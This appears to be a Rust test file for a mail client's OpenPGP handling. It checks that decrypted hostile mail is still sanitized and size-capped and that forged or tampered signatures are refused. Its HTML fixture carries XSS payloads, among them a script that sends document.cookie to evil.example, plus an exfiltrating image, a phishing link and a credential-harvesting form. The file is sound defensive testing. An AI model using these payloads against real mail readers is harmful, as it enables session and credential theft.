//! Hostile end-to-end-encrypted mail, driven through the real crypto path
//! (`docs/mail_encryption_plan.md` §9).
//!
//! `mail_hostile_message.rs` proves the inbound pipeline survives a hostile
//! *plaintext* message. This proves the thing the encryption work adds, which is
//! a genuinely different question: **decryption confers no trust.** A decrypted
//! body arrives wearing a padlock and is, if anything, more attacker-controlled
//! than a plain one — the padlock is exactly what makes a reader lower their
//! guard, and the message may have been encrypted *to* the victim by the
//! attacker.
//!
//! So the property under test is that nothing about the crypto layer lets a
//! payload skip a step: the plaintext that comes out of a decryption goes
//! through the same structural caps and the same sanitizer as anything the
//! server handed over in the clear, and a signature is never reported as good
//! over bytes the sender did not sign.
//!
//! Fixtures are built here rather than checked in, because every one of them
//! needs a real key: a hand-typed armor block cannot produce a *valid* signature
//! over the wrong body, which is the case that matters most.

use app_lib::services::mail_crypt::{Key, MailKeys};
use app_lib::services::mail_crypto::{self, CryptoKind, VerifyOutcome};
use app_lib::services::mail_engine::parse_message;
use app_lib::services::mail_pgp::{self, PgpKeyring, SealOpts};
use app_lib::services::mail_sanitize::sanitize_message_html;

fn keyring(seed: u8) -> (tempfile::TempDir, PgpKeyring) {
    let dir = tempfile::tempdir().unwrap();
    let keys = MailKeys::derive(Key::from_bytes([seed; 32]));
    let ring = PgpKeyring::open(dir.path(), &keys).unwrap();
    (dir, ring)
}

fn parse(raw: &[u8]) -> mail_parser::Message<'_> {
    mail_parser::MessageParser::default().parse(raw).unwrap()
}

/// The body of the message every hostile case below carries: a payload set
/// small enough to read, aimed at the three things that would matter if
/// decryption were allowed to bypass the sanitizer.
const HOSTILE_HTML: &str = concat!(
    "<p>Please confirm your password.</p>",
    "<script>fetch('https://evil.example/'+document.cookie)</script>",
    // The EFAIL shape: markup whose *rendering* exfiltrates, which needs a
    // renderer willing to fetch. Ours blocks remote references and runs in a
    // `sandbox=\"\"` frame, but the sanitizer is the layer that must strip it.
    "<img src=\"https://evil.example/leak?d=\">",
    "<a href=\"https://evil.example\">bank.example</a>",
    "<iframe src=\"https://evil.example\"></iframe>",
    "<form action=\"https://evil.example\"><input name=\"pw\"></form>",
);

fn hostile_message() -> Vec<u8> {
    format!(
        "From: Attacker <attacker@evil.example>\r\n\
         To: victim@example.com\r\n\
         Subject: urgent\r\n\
         MIME-Version: 1.0\r\n\
         Content-Type: text/html; charset=utf-8\r\n\
         \r\n\
         <html><body>{HOSTILE_HTML}</body></html>\r\n"
    )
    .into_bytes()
}

/// Markup that must never survive, whichever door the payload came in by.
const FORBIDDEN: &[&str] = &[
    "<script", "</script", "<iframe", "<form", "<input", "<object", "<embed", "<base",
];

/// The whole point of the file: an attacker encrypts a hostile message **to the
/// victim's own key**, so it decrypts perfectly. Everything after the decryption
/// must behave exactly as it would for plaintext.
#[test]
fn a_decrypted_body_still_goes_through_the_sanitizer() {
    let (_dv, victim) = keyring(1);
    let victim_key = victim
        .generate("Victim", "victim@example.com", "acct-v")
        .unwrap();
    let victim_pub = victim.export_public(&victim_key.fingerprint).unwrap();

    // The attacker holds only the victim's public key — which is all anyone
    // needs to send them encrypted mail. That is not a flaw in OpenPGP; it is
    // what a public key is for, and it is precisely why decryption cannot be
    // allowed to mean trust.
    let (_da, attacker) = keyring(2);
    attacker
        .generate("Attacker", "attacker@evil.example", "acct-a")
        .unwrap();
    attacker.import(victim_pub.as_bytes()).unwrap();

    let sealed = attacker
        .seal_outgoing(
            "acct-a",
            &["victim@example.com".into()],
            &hostile_message(),
            SealOpts {
                sign: false,
                encrypt: true,
            },
        )
        .unwrap();

    let outer = parse(&sealed);
    assert_eq!(mail_crypto::detect(&outer), Some(CryptoKind::PgpEncrypted));
    // The ciphertext really is opaque — the payload is not sitting in the
    // message in the clear waiting for a renderer that never decrypts.
    let wire = String::from_utf8_lossy(&sealed);
    assert!(
        !wire.contains("<script"),
        "the payload is inside the envelope"
    );

    let payload = mail_pgp::encrypted_part_bytes(&sealed, &outer).unwrap();
    let plain = victim.decrypt_message(&payload).unwrap();

    // decrypt → parse → sanitize, in that order, exactly as `commands::mail`
    // does it. Every structural cap applies to the plaintext.
    let parsed = parse_message(&plain).expect("the decrypted message must parse under the caps");
    let html = parsed.html.expect("the hostile part is text/html");
    assert!(
        html.contains("<script"),
        "the raw decrypted body is still hostile"
    );

    let clean = sanitize_message_html(&html).unwrap();
    for banned in FORBIDDEN {
        assert!(
            !clean.html.to_ascii_lowercase().contains(banned),
            "{banned} survived sanitization of a DECRYPTED body"
        );
    }
    assert!(
        clean.remote_refs > 0,
        "the exfiltrating image must be counted as blocked"
    );
    // No `href` reaches the renderer at all: links are markers resolved against
    // `MailBody.links`, which is what makes the confirm-before-open gate work.
    assert!(!clean.html.contains("https://evil.example"));
}

/// A valid signature over a **different body**: the attacker takes a real
/// signature the victim's correspondent produced and staples it to their own
/// message. It must not verify — this is the failure mode where a wrong answer
/// is a *positive* one, so it is the one worth a dedicated fixture.
#[test]
fn a_signature_over_a_different_body_is_refused() {
    let (_ds, sender) = keyring(3);
    sender
        .generate("Colleague", "colleague@example.com", "acct-c")
        .unwrap();
    let fp = sender.list().unwrap()[0].fingerprint.clone();
    let colleague_pub = sender.export_public(&fp).unwrap();

    let honest = b"Content-Type: text/plain\r\n\r\nlunch at one?";
    let signature = sender.sign_detached("acct-c", honest).unwrap();

    let (_dv, victim) = keyring(4);
    victim.import(colleague_pub.as_bytes()).unwrap();
    // Even after the victim verifies the fingerprint — the strongest position
    // they can be in — the stapled signature must not pass.
    victim.set_verified(&fp, true).unwrap();

    assert!(
        matches!(
            victim.verify_detached(honest, signature.as_bytes()),
            VerifyOutcome::Good { .. }
        ),
        "the honest pairing must still verify, or this test proves nothing"
    );

    let forged = b"Content-Type: text/plain\r\n\r\nwire 50000 to account 12345";
    assert_eq!(
        victim.verify_detached(forged, signature.as_bytes()),
        VerifyOutcome::Bad,
        "a real signature stapled to a different body must be reported as bad"
    );
}

/// Reassembling a signed message with the signed part edited: the same attack as
/// above, but delivered as a whole message so it exercises `signed_part_bytes`
/// — the slicing function whose mistakes are silent and positive.
#[test]
fn editing_the_signed_part_breaks_the_signature_in_a_real_message() {
    let (_ds, sender) = keyring(5);
    sender
        .generate("Colleague", "colleague@example.com", "acct-c")
        .unwrap();
    let fp = sender.list().unwrap()[0].fingerprint.clone();
    let pubkey = sender.export_public(&fp).unwrap();

    let original = b"From: Colleague <colleague@example.com>\r\n\
        To: victim@example.com\r\n\
        Subject: invoice\r\n\
        MIME-Version: 1.0\r\n\
        Content-Type: text/plain; charset=utf-8\r\n\
        \r\n\
        Please pay account 11111.\r\n";
    let sealed = sender
        .seal_outgoing(
            "acct-c",
            &[],
            original,
            SealOpts {
                sign: true,
                encrypt: false,
            },
        )
        .unwrap();

    let (_dv, victim) = keyring(6);
    victim.import(pubkey.as_bytes()).unwrap();

    // Untouched: verifies.
    let msg = parse(&sealed);
    let (signed, signature) = mail_pgp::signed_part_bytes(&sealed, &msg).unwrap();
    assert!(
        matches!(
            victim.verify_detached(&signed, &signature),
            VerifyOutcome::Good { .. }
        ),
        "the untouched message must verify"
    );

    // One account number changed, same length, so nothing structural shifts.
    let tampered: Vec<u8> = String::from_utf8_lossy(&sealed)
        .replace("account 11111", "account 22222")
        .into_bytes();
    let msg = parse(&tampered);
    let (signed, signature) = mail_pgp::signed_part_bytes(&tampered, &msg).unwrap();
    assert_eq!(
        victim.verify_detached(&signed, &signature),
        VerifyOutcome::Bad,
        "a body edited in transit must not verify"
    );
}

/// Malformed armor, truncated ciphertext, and an armored block that is simply
/// prose. None may panic, and none may be reported as anything but a failure.
#[test]
fn malformed_crypto_never_panics_and_never_passes() {
    let (_d, ring) = keyring(7);
    ring.generate("Me", "me@example.com", "acct-m").unwrap();

    let junk: &[&[u8]] = &[
        b"",
        b"-----BEGIN PGP MESSAGE-----\r\n-----END PGP MESSAGE-----\r\n",
        b"-----BEGIN PGP MESSAGE-----\r\nnot base64 at all !!!\r\n",
        b"-----BEGIN PGP SIGNATURE-----\r\nAAAA\r\n-----END PGP SIGNATURE-----\r\n",
        &[0xffu8; 512],
    ];
    for bytes in junk {
        assert!(
            ring.decrypt_message(bytes).is_err(),
            "malformed input must never decrypt to something"
        );
        assert!(
            !matches!(
                ring.verify_detached(b"anything", bytes),
                VerifyOutcome::Good { .. }
            ),
            "malformed input must never verify"
        );
    }
}

/// A message that merely *quotes* armor, or claims a crypto content type it does
/// not carry, must not be presented as protected. A padlock the sender can draw
/// is worse than no padlock at all.
#[test]
fn a_message_cannot_claim_protection_it_does_not_have() {
    // Prose about PGP.
    let quoting = b"From: a@example.com\r\nContent-Type: text/plain\r\n\r\n\
        you write \"-----BEGIN PGP MESSAGE-----\" at the top of the block\r\n";
    assert_eq!(mail_crypto::detect(&parse(quoting)), None);

    // A `multipart/signed` wrapper with no signature part at all: detected as
    // signed (it says it is), but with nothing to verify it can only ever reach
    // a non-positive state.
    let empty = b"From: a@example.com\r\n\
        Content-Type: multipart/signed; protocol=\"application/pgp-signature\"; boundary=\"B\"\r\n\
        \r\n--B\r\nContent-Type: text/plain\r\n\r\nhi\r\n--B--\r\n";
    let msg = parse(empty);
    assert_eq!(mail_crypto::detect(&msg), Some(CryptoKind::PgpSigned));
    assert!(
        mail_pgp::signed_part_bytes(empty, &msg).is_none(),
        "there is no signature to slice, so nothing may be verified"
    );

    let info = mail_crypto::info_for(CryptoKind::PgpSigned, None, false, "a@example.com");
    assert_ne!(
        info.state,
        app_lib::schema::mail::MailCryptoState::Verified,
        "no verification means no positive chrome"
    );
}

/// A decrypted body far larger than what arrived on the wire.
///
/// OpenPGP messages may be compressed, so `Message::decompress` on the read path
/// is a second door for a decompression bomb — the first being IMAP's
/// `COMPRESS=DEFLATE`, which is deliberately not enabled for exactly this
/// reason. What protects here is that the size cap is applied to the
/// **plaintext**, by running `parse_message` after the decryption rather than
/// on what the server sent.
///
/// Honest limitation of this fixture: rPGP's `MessageBuilder` does not compress,
/// so the message built here is not smaller than its plaintext and is not a real
/// bomb. What it does prove is the half that is ours to get right — that the cap
/// sees the decrypted size. A genuine compressed bomb would need a fixture
/// produced by another implementation.
#[test]
fn an_oversized_decrypted_body_is_refused_by_the_same_cap_as_a_plain_one() {
    let (_dv, victim) = keyring(8);
    let key = victim
        .generate("Victim", "victim@example.com", "acct-v")
        .unwrap();
    let pubkey = victim.export_public(&key.fingerprint).unwrap();
    let (_da, attacker) = keyring(9);
    attacker.generate("A", "a@evil.example", "acct-a").unwrap();
    attacker.import(pubkey.as_bytes()).unwrap();

    // Comfortably over `mail_engine::MAX_MESSAGE_BYTES` (50 MiB). The point is
    // the *ratio*: this compresses to a few kilobytes on the wire, so the size
    // cap has to be applied to the plaintext rather than to what arrived — which
    // is exactly what running `parse_message` after `decrypt` achieves.
    let mut huge = b"From: a@evil.example\r\nContent-Type: text/plain\r\n\r\n".to_vec();
    huge.extend(std::iter::repeat_n(b'A', 60 * 1024 * 1024));

    let sealed = attacker
        .seal_outgoing(
            "acct-a",
            &["victim@example.com".into()],
            &huge,
            SealOpts {
                sign: false,
                encrypt: true,
            },
        )
        .unwrap();
    let outer = parse(&sealed);
    let payload = mail_pgp::encrypted_part_bytes(&sealed, &outer).unwrap();
    let plain = victim.decrypt_message(&payload).unwrap();

    assert!(
        plain.len() > 50 * 1024 * 1024,
        "the fixture must exceed the cap once decrypted"
    );
    assert!(
        parse_message(&plain).is_err(),
        "the decrypted plaintext must meet the same size cap as a plain message"
    );
}
